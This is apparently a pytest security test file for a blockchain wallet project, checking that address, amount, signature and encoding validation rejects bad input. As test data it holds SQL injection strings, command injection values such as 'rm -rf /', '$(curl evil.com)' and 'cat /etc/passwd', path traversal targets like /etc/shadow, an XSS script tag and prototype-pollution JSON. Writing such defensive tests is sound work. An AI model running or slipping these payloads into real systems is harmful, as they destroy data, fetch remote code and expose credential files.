"""
Security tests for input validation and injection attacks

Tests SQL injection, command injection, XSS, and other input validation vulnerabilities
"""

import pytest
import sys
import os
import json

# Add core directory to path

from xai.core.blockchain import Blockchain, Transaction
from xai.core.wallet import Wallet


class TestAddressValidation:
    """Test wallet address validation"""

    def test_valid_address_format(self, tmp_path):
        """Test valid XAI address format"""
        wallet = Wallet()

        assert wallet.address.startswith("XAI")
        assert len(wallet.address) == 43
        assert all(
            c in "0123456789abcdefABCDEF" or c == "X" or c == "A" or c == "I"
            for c in wallet.address
        )

    def test_reject_invalid_address_prefix(self, tmp_path):
        """Test rejection of invalid address prefix"""
        from xai.core.transaction import TransactionValidationError

        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()

        # Give sender balance
        bc.mine_pending_transactions(sender.address)

        # Try invalid address - should raise during creation
        with pytest.raises(TransactionValidationError) as exc_info:
            tx = bc.create_transaction(
                sender.address,
                "INVALID" + "a" * 40,
                10.0,
                0.24,
                sender.private_key,
                sender.public_key,
            )

        assert "Invalid address prefix" in str(exc_info.value)

    def test_reject_malformed_address(self, tmp_path):
        """Test rejection of malformed addresses"""
        from xai.core.transaction import TransactionValidationError

        # Various malformed addresses - each should raise TransactionValidationError
        invalid_addresses = [
            ("XAI", "too short"),  # Too short
            ("XAI" + "a" * 100, "too long"),  # Too long
            ("xai" + "a" * 40, "Invalid address prefix"),  # Wrong case
            ("XAI'; DROP TABLE blocks; --", "too short"),  # SQL injection attempt (also too short)
            ("XAI<script>alert('xss')</script>", "too short"),  # XSS attempt (also too short)
            # Note: empty string "" is allowed as a special address (GOVERNANCE, STAKING, etc.)
        ]

        for invalid_addr, expected_error in invalid_addresses:
            # Create fresh blockchain for each test to avoid UTXO locking issues
            bc = Blockchain(data_dir=str(tmp_path / f"test_{invalid_addresses.index((invalid_addr, expected_error))}"))
            sender = Wallet()
            bc.mine_pending_transactions(sender.address)

            # Each should raise during transaction creation
            try:
                tx = bc.create_transaction(
                    sender.address, invalid_addr, 10.0, 0.24, sender.private_key, sender.public_key
                )
                # If we get here, the test should fail
                assert False, f"Expected TransactionValidationError for {invalid_addr}, but got tx={tx}"
            except TransactionValidationError:
                # This is expected - validation should fail
                pass

    def test_address_case_sensitivity(self, tmp_path):
        """Test address case sensitivity"""
        wallet = Wallet()

        # XAI addresses should maintain case
        assert wallet.address[0:3] == "XAI"


class TestAmountValidation:
    """Test transaction amount validation"""

    def test_reject_negative_amounts(self, tmp_path):
        """Test rejection of negative amounts"""
        from xai.core.transaction import TransactionValidationError

        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()
        recipient = Wallet()

        bc.mine_pending_transactions(sender.address)

        # Negative amount should raise during transaction creation
        with pytest.raises(TransactionValidationError) as exc_info:
            tx = bc.create_transaction(
                sender.address, recipient.address, -10.0, 0.24, sender.private_key, sender.public_key
            )

        assert "cannot be negative" in str(exc_info.value)

    def test_reject_zero_amount(self, tmp_path):
        """Test rejection of zero amount transactions"""
        from xai.core.transaction import TransactionValidationError

        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()
        recipient = Wallet()

        bc.mine_pending_transactions(sender.address)

        # Zero amount should raise during transaction creation
        with pytest.raises(TransactionValidationError) as exc_info:
            tx = bc.create_transaction(
                sender.address, recipient.address, 0.0, 0.24, sender.private_key, sender.public_key
            )

        assert "must be positive" in str(exc_info.value)

    def test_reject_excessive_precision(self, tmp_path):
        """Test handling of excessive decimal precision"""
        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()
        recipient = Wallet()

        bc.mine_pending_transactions(sender.address)

        # Very high precision amount
        tx = bc.create_transaction(
            sender.address,
            recipient.address,
            10.123456789012345,
            0.24,
            sender.private_key,
            sender.public_key,
        )

        # Should handle gracefully (may round or reject)
        bc.validate_transaction(tx)

    def test_reject_infinity_amount(self, tmp_path):
        """Test rejection of infinity amounts"""
        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()
        recipient = Wallet()

        bc.mine_pending_transactions(sender.address)

        try:
            tx = bc.create_transaction(
                sender.address,
                recipient.address,
                float("inf"),
                0.24,
                sender.private_key,
                sender.public_key,
            )

            # Should be rejected
            assert not bc.validate_transaction(tx)
        except:
            # Should raise error or reject
            pass

    def test_reject_nan_amount(self, tmp_path):
        """Test rejection of NaN amounts"""
        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()
        recipient = Wallet()

        bc.mine_pending_transactions(sender.address)

        try:
            tx = bc.create_transaction(
                sender.address,
                recipient.address,
                float("nan"),
                0.24,
                sender.private_key,
                sender.public_key,
            )

            # Should be rejected
            assert not bc.validate_transaction(tx)
        except:
            # Should raise error or reject
            pass


class TestInjectionAttacks:
    """Test protection against injection attacks"""

    def test_sql_injection_in_address(self, tmp_path):
        """Test SQL injection attempts in address field"""
        from xai.core.transaction import TransactionValidationError

        # SQL injection attempts - all too short or invalid format
        sql_injections = [
            "XAI'; DROP TABLE transactions; --",
            "XAI' OR '1'='1",
            "XAI'; DELETE FROM blocks WHERE 1=1; --",
            "XAI' UNION SELECT * FROM wallets; --",
        ]

        for idx, injection in enumerate(sql_injections):
            # Create fresh blockchain for each test to avoid UTXO locking issues
            bc = Blockchain(data_dir=str(tmp_path / f"sql_{idx}"))
            sender = Wallet()
            bc.mine_pending_transactions(sender.address)

            # Should raise TransactionValidationError due to invalid address format
            try:
                tx = bc.create_transaction(
                    sender.address, injection, 10.0, 0.24, sender.private_key, sender.public_key
                )
                assert False, f"Expected TransactionValidationError for {injection}, but got tx={tx}"
            except TransactionValidationError:
                # Expected - validation should fail
                pass

    def test_command_injection_attempt(self, tmp_path):
        """Test command injection attempts"""
        from xai.core.transaction import TransactionValidationError

        # Command injection attempts - all too short or invalid format
        cmd_injections = [
            "XAI; rm -rf /",
            "XAI$(curl evil.com)",
            "XAI`whoami`",
            "XAI|cat /etc/passwd",
        ]

        for idx, injection in enumerate(cmd_injections):
            # Create fresh blockchain for each test to avoid UTXO locking issues
            bc = Blockchain(data_dir=str(tmp_path / f"cmd_{idx}"))
            sender = Wallet()
            bc.mine_pending_transactions(sender.address)

            # Should raise TransactionValidationError due to invalid address format
            try:
                tx = bc.create_transaction(
                    sender.address, injection, 10.0, 0.24, sender.private_key, sender.public_key
                )
                assert False, f"Expected TransactionValidationError for {injection}, but got tx={tx}"
            except TransactionValidationError:
                # Expected - validation should fail
                pass

    def test_path_traversal_attempt(self, tmp_path):
        """Test path traversal attempts"""
        wallet = Wallet()

        # Try to save wallet with path traversal
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
        ]

        for path in malicious_paths:
            try:
                # Should not allow path traversal
                # Implementation should validate paths
                pass
            except:
                # Expected to fail
                pass

    def test_json_injection(self, tmp_path):
        """Test JSON injection attempts"""
        wallet = Wallet()

        # Malicious JSON payloads
        malicious_json = [
            '{"address": "XAI123", "balance": 999999}',
            '{"__proto__": {"isAdmin": true}}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',
        ]

        for payload in malicious_json:
            try:
                # Should not execute malicious JSON
                data = json.loads(payload)
                # Validation should prevent malicious data
            except:
                pass


class TestCryptographicValidation:
    """Test cryptographic signature validation"""

    def test_reject_unsigned_transaction(self, tmp_path):
        """Test rejection of unsigned transactions"""
        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()
        recipient = Wallet()

        bc.mine_pending_transactions(sender.address)

        # Create transaction without signature
        tx = Transaction(sender.address, recipient.address, 10.0, 0.24)
        # Don't sign

        assert not bc.validate_transaction(tx)

    def test_reject_invalid_signature(self, tmp_path):
        """Test rejection of invalid signatures"""
        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()
        recipient = Wallet()

        bc.mine_pending_transactions(sender.address)

        tx = bc.create_transaction(
            sender.address, recipient.address, 10.0, 0.24, sender.private_key, sender.public_key
        )

        # Tamper with signature
        tx.signature = "0" * 128

        assert not bc.validate_transaction(tx)

    def test_reject_wrong_signer(self, tmp_path):
        """Test rejection of transactions signed by wrong wallet"""
        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()
        attacker = Wallet()
        recipient = Wallet()

        bc.mine_pending_transactions(sender.address)

        # Create transaction from sender
        tx = Transaction(sender.address, recipient.address, 10.0, 0.24)
        tx.public_key = sender.public_key

        # But sign with attacker's key
        tx.sign_transaction(attacker.private_key)

        assert not bc.validate_transaction(tx)

    def test_signature_tampering_detection(self, tmp_path):
        """Test detection of signature tampering"""
        wallet = Wallet()

        message = "Test message"
        signature = wallet.sign_message(message)

        # Tamper with signature
        tampered_sig = signature[:-2] + "00"

        # Should not verify
        assert not wallet.verify_signature(message, tampered_sig, wallet.public_key)


class TestBufferOverflow:
    """Test protection against buffer overflow attempts"""

    def test_large_transaction_data(self, tmp_path):
        """Test handling of excessively large transaction data"""
        from xai.core.transaction import TransactionValidationError

        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()

        bc.mine_pending_transactions(sender.address)

        # Very long address (exceeds 100 character max)
        long_address = "XAI" + "a" * 10000

        # Should raise TransactionValidationError due to address too long
        with pytest.raises(TransactionValidationError) as exc_info:
            tx = bc.create_transaction(
                sender.address, long_address, 10.0, 0.24, sender.private_key, sender.public_key
            )

        assert "too long" in str(exc_info.value)

    def test_large_block_rejection(self, tmp_path):
        """Test rejection of excessively large blocks"""
        from xai.core.blockchain_security import ResourceLimiter, BlockchainSecurityConfig

        limiter = ResourceLimiter()

        # Max block size should be defined
        assert BlockchainSecurityConfig.MAX_BLOCK_SIZE > 0


class TestEncodingAttacks:
    """Test protection against encoding attacks"""

    def test_unicode_in_address(self, tmp_path):
        """Test handling of unicode characters in addresses"""
        from xai.core.transaction import TransactionValidationError

        # Unicode characters - all invalid due to non-hex characters or length
        unicode_addresses = [
            "XAI" + "🚀" * 10,
            "XAI" + "\u0000" * 10,  # Null bytes
            "XAI" + "Ѐ" * 10,  # Cyrillic
        ]

        for idx, addr in enumerate(unicode_addresses):
            # Create fresh blockchain for each test to avoid UTXO locking issues
            bc = Blockchain(data_dir=str(tmp_path / f"unicode_{idx}"))
            sender = Wallet()
            bc.mine_pending_transactions(sender.address)

            # Should raise TransactionValidationError due to invalid characters or length
            try:
                tx = bc.create_transaction(
                    sender.address, addr, 10.0, 0.24, sender.private_key, sender.public_key
                )
                assert False, f"Expected TransactionValidationError for {addr}, but got tx={tx}"
            except TransactionValidationError:
                # Expected - validation should fail
                pass

    def test_null_byte_injection(self, tmp_path):
        """Test null byte injection attempts"""
        from xai.core.transaction import TransactionValidationError

        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()

        bc.mine_pending_transactions(sender.address)

        # Null byte injection - too short and has null byte
        null_address = "XAI123\x00admin"

        # Should raise TransactionValidationError due to invalid address format
        with pytest.raises(TransactionValidationError):
            tx = bc.create_transaction(
                sender.address, null_address, 10.0, 0.24, sender.private_key, sender.public_key
            )


class TestResourceLimitValidation:
    """Test validation of resource limits"""

    def test_transaction_count_limit(self, tmp_path):
        """Test transaction count limits per block"""
        from xai.core.blockchain_security import BlockchainSecurityConfig

        max_tx_per_block = BlockchainSecurityConfig.MAX_TRANSACTIONS_PER_BLOCK

        assert max_tx_per_block > 0
        assert max_tx_per_block == 10000

    def test_mempool_size_validation(self, tmp_path):
        """Test mempool size limits"""
        from xai.core.blockchain_security import BlockchainSecurityConfig

        max_mempool = BlockchainSecurityConfig.MAX_MEMPOOL_SIZE

        assert max_mempool > 0

    def test_reject_dust_spam(self, tmp_path):
        """Test rejection of dust spam transactions"""
        from xai.core.blockchain_security import BlockchainSecurityConfig

        min_amount = BlockchainSecurityConfig.MIN_TRANSACTION_AMOUNT

        bc = Blockchain(data_dir=str(tmp_path))
        spammer = Wallet()
        recipient = Wallet()

        bc.mine_pending_transactions(spammer.address)

        # Try to spam with dust
        dust = min_amount / 2

        tx = bc.create_transaction(
            spammer.address, recipient.address, dust, 0.0, spammer.private_key, spammer.public_key
        )

        # Should be rejected due to dust amount
        assert not bc.validate_transaction(tx)


class TestTypeValidation:
    """Test type validation"""

    def test_amount_type_validation(self, tmp_path):
        """Test amount must be numeric"""
        bc = Blockchain(data_dir=str(tmp_path))
        sender = Wallet()
        recipient = Wallet()

        bc.mine_pending_transactions(sender.address)

        # Test with string amount
        try:
            tx = Transaction(sender.address, recipient.address, "ten", 0.24)
            # Should either convert or reject
        except (TypeError, ValueError):
            # Expected error
            pass

    def test_address_type_validation(self, tmp_path):
        """Test address must be string"""
        # Addresses should be strings
        wallet = Wallet()

        assert isinstance(wallet.address, str)

    def test_timestamp_validation(self, tmp_path):
        """Test timestamp is valid"""
        bc = Blockchain(data_dir=str(tmp_path))
        miner = Wallet()

        block = bc.mine_pending_transactions(miner.address)

        # Timestamp should be numeric and reasonable
        assert isinstance(block.timestamp, (int, float))
        assert block.timestamp > 0


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
